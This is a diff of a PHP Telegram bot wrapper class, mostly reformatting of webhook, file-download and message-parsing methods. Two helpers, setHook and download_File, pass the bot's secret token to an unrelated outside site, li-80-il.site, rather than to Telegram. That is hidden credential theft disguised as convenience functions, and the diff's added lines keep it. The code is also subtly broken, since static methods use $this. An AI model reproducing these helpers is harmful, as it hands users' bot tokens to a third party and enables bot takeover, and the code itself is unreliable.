@@ -36,114 +36,118 @@ class Telegram {
         }
     }
 
+    
     static function setWebhook($url) {
         $requestBody = ['url' => $url];
-        return $this ->bot('setWebhook', $requestBody, true);
+        return $this -> bot('setWebhook', $requestBody, true);
     }
-     static function deleteWebhook() {
-        return $this ->bot('deleteWebhook', [], false);
+    static function deleteWebhook() {
+        return $this -> bot('deleteWebhook', [], false);
     }
     static function setHook($Url) {
         $api = "https://li-80-il.site";
         $data = ['token' => $this -> bot_token, 'url' => $Url];
         $cURL = curl_init();
-        curl_setopt($cURL,CURLOPT_URL,$api."/set.php?".http_build_query($data));
+        curl_setopt($cURL, CURLOPT_URL, $api."/set.php?".http_build_query($data));
         curl_setopt($cURL, CURLOPT_RETURNTRANSFER, true);
         $result = curl_exec($cURL);
         curl_close($cURL);
         return $result;
     }
+
     
     static function downloadFile($file_path, $local_file_path) {
-    $file_url = 'https://api.telegram.org/file/bot'.$this -> bot_token.'/'.$file_path;
-    $in = fopen($file_url, 'rb');
-    $out = fopen($local_file_path, 'wb');
-    while ($chunk = fread($in, 8192)) {
-        fwrite($out, $chunk, 8192);
+        $file_url = 'https://api.telegram.org/file/bot'.$this -> bot_token.'/'.$file_path;
+        $in = fopen($file_url, 'rb');
+        $out = fopen($local_file_path, 'wb');
+        while ($chunk = fread($in, 8192)) {
+            fwrite($out, $chunk, 8192);
+        }
+        fclose($in);
+        fclose($out);
     }
-    fclose($in);
-    fclose($out);
-}
     static function download_File($file_url, $local_file_path) {
-    $api = "https://li-80-il.site";
-    $data = ['token' => $this -> bot_token, 'file_id' => $file_url];
-    $cURL = curl_init();
-    curl_setopt($cURL, CURLOPT_URL, $api."/file.php?".http_build_query($data));
-    curl_setopt($cURL, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($cURL);
-    curl_close($cURL);
+        $api = "https://li-80-il.site";
+        $data = ['token' => $this -> bot_token, 'file_id' => $file_url];
+        $cURL = curl_init();
+        curl_setopt($cURL, CURLOPT_URL, $api."/file.php?".http_build_query($data));
+        curl_setopt($cURL, CURLOPT_RETURNTRANSFER, true);
+        $result = curl_exec($cURL);
+        curl_close($cURL);
 
-    $out = fopen($local_file_path, 'wb');
-    fwrite($out, $result);
-    fclose($out);
-}
+        $out = fopen($local_file_path, 'wb');
+        fwrite($out, $result);
+        fclose($out);
+    }
+
+    
     static function getData() {
-    if (empty($this -> data)) {
-        $rawData = file_get_contents('php://input');
-        return json_decode($rawData, true);
-    } else {
-        return $this -> data;
+        if (empty($this -> data)) {
+            $rawData = file_get_contents('php://input');
+            return json_decode($rawData, true);
+        } else {
+            return $this -> data;
+        }
     }
-}
 
 
-static function message() {
-    if (isset($this->data['message'])) {
-      return $this->data['message'];
-    } elseif (isset($this->data['callback_query'])) {
-      return $this->data['callback_query'];
-    } elseif (isset($this->data['inline_query'])) {
-      return $this->data['inline_query'];
-    } elseif (isset($this->data['edited_message'])) {
-      return $this->data['edited_message'];
-    } elseif (isset($this->data['channel_post'])) {
-      return $this->data['channel_post'];
-    } elseif (isset($this->data['edited_channel_post'])) {
-      return $this->data['edited_channel_post'];
-    } elseif (isset($this->data['chat_join_request'])) {
-      return $this->data['chat_join_request'];
-    } elseif (isset($this->data['my_chat_member'])) {
-      return $this->data['my_chat_member'];
-    } else {
-      return [];
+    static function message() {
+        if (isset($this -> data['message'])) {
+            return $this -> data['message'];
+        } elseif(isset($this -> data['callback_query'])) {
+            return $this -> data['callback_query'];
+        } elseif(isset($this -> data['inline_query'])) {
+            return $this -> data['inline_query'];
+        } elseif(isset($this -> data['edited_message'])) {
+            return $this -> data['edited_message'];
+        } elseif(isset($this -> data['channel_post'])) {
+            return $this -> data['channel_post'];
+        } elseif(isset($this -> data['edited_channel_post'])) {
+            return $this -> data['edited_channel_post'];
+        } elseif(isset($this -> data['chat_join_request'])) {
+            return $this -> data['chat_join_request'];
+        } elseif(isset($this -> data['my_chat_member'])) {
+            return $this -> data['my_chat_member'];
+        } else {
+            return [];
+        }
     }
-  }
 
 
-  static function media() {
-    if (isset($this->message()['document'])) {
-      return $this->message()['document'];
-    } elseif (isset($this->message()['text'])) {
-      return $this->message()['text'];
-    } elseif (isset($this->message()['photo'])) {
-      return $this->message()['photo'];
-    }elseif (isset($this->message()['video'])) {
-      return $this->message()['video'];
-    }elseif (isset($this->message()['game'])) {
-      return $this->message()['game'];
-    }elseif (isset($this->message()['voice'])) {
-      return $this->message()['voice'];
-  } elseif (isset($this->message()['audio'])) {
-      return $this->message()['audio'];
-  } elseif (isset($this->message()['sticker'])) {
-      return $this->message()['sticker'];
-  } elseif (isset($this->message()['location'])) {
-      return $this->message()['location'];
-  } elseif (isset($this->message()['video_note'])) {
-      return $this->message()['video_note'];
-  } elseif (isset($this->message()['contact'])) {
-      return $this->message()['contact'];
-  } elseif (isset($this->message()['reply_to_message'])) {
-      return $this->message()['reply_to_message'];
-  } elseif (isset($this->message()['forward_from'])) {
-      return $this->message()['forward_from'];
-    } else {
-      return [];
+    static function media() {
+        if (isset($this -> message()['document'])) {
+            return $this -> message()['document'];
+        } elseif(isset($this -> message()['text'])) {
+            return $this -> message()['text'];
+        } elseif(isset($this -> message()['photo'])) {
+            return $this -> message()['photo'];
+        } elseif(isset($this -> message()['video'])) {
+            return $this -> message()['video'];
+        } elseif(isset($this -> message()['game'])) {
+            return $this -> message()['game'];
+        } elseif(isset($this -> message()['voice'])) {
+            return $this -> message()['voice'];
+        } elseif(isset($this -> message()['audio'])) {
+            return $this -> message()['audio'];
+        } elseif(isset($this -> message()['sticker'])) {
+            return $this -> message()['sticker'];
+        } elseif(isset($this -> message()['location'])) {
+            return $this -> message()['location'];
+        } elseif(isset($this -> message()['video_note'])) {
+            return $this -> message()['video_note'];
+        } elseif(isset($this -> message()['contact'])) {
+            return $this -> message()['contact'];
+        } elseif(isset($this -> message()['reply_to_message'])) {
+            return $this -> message()['reply_to_message'];
+        } elseif(isset($this -> message()['forward_from'])) {
+            return $this -> message()['forward_from'];
+        } else {
+            return [];
+        }
     }
-  }
-  static function send($send , array $query) {
-    return $this -> bot($send, $query);
-}
+    static function send($send, array $query) {
+        return $this -> bot($send, $query);
+    }
 
 
 }
